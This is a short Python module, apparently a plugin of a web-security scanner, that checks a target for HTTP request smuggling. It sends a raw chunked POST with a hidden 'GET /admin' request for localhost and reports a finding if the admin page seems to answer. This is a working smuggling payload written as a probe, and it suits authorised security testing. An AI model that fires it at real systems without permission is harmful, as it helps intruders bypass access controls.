"""chunked — transfer-encoding chunked smuggling probe (basic)"""
from core.http import HttpClient
import socket
from urllib.parse import urlparse

class Chunked:
    def run(self, session, logger):
        u = urlparse(session.target)
        if u.scheme != "http":
            print("[chunked] http only (raw socket)"); return {}
        host, port = u.hostname, u.port or 80
        findings = []

        # smuggling basic: TE: chunked with embedded request
        raw = (
            f"POST / HTTP/1.1\r\nHost: {host}\r\n"
            "Transfer-Encoding: chunked\r\n\r\n"
            "0\r\n\r\n"
            "GET /admin HTTP/1.1\r\nHost: localhost\r\nX-Ignore: X\r\n\r\n"
        )
        try:
            s = socket.create_connection((host, port), timeout=6)
            s.sendall(raw.encode())
            s.settimeout(4)
            buf = b""
            try:
                while True:
                    c = s.recv(4096)
                    if not c: break
                    buf += c
            except socket.timeout: pass
            s.close()
            text = buf.decode(errors="ignore")
            if "admin" in text.lower() and "403" not in text:
                findings.append({"type":"te.chunked_smuggle","evidence":text[:200]})
                print("  [!] possible TE smuggling")
                logger.finding("chunked_smuggle","high","evidence in response")
            else:
                print(f"  probe: {text.split(chr(13))[0][:80]}")
        except Exception as e:
            print(f"  error: {e}")
        return {"findings": findings}
